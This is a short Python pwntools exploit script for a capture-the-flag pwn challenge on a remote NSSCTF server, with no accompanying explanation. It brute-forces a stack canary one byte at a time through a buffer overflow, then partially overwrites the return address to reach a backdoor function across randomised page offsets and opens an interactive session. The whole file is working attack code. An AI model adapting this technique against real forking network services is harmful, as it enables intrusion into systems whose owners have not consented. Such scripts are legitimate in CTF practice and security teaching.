from pwn import *

context(os="linux", arch="amd64", log_level="debug")
#io = process("./service")
io = remote("node5.anna.nssctf.cn", 27245)

backdoor = 0x231
canary = b"\x00"

io.recvuntil(b"welcome")
for i in range(7):
    for i in range(256):
        payload = b"a" * (0x70-0x8) + canary + bytes([i])
        io.send(payload)
        outPut = io.recvuntil(b"welcome\n")
        if b"fun" in outPut:
            canary += bytes([i])
            print("canary =", str(canary))
            break


for i in range(16):
    num = i << 12
    payload = b'a' * (0x70 - 0x8) + canary + b'a' * 8 + p16(backdoor + num)
    io.send(payload)
    outPut = io.recv()
    if b"NSSCTF" in outPut:
        print(str(outPut))
        break

io.interactive()
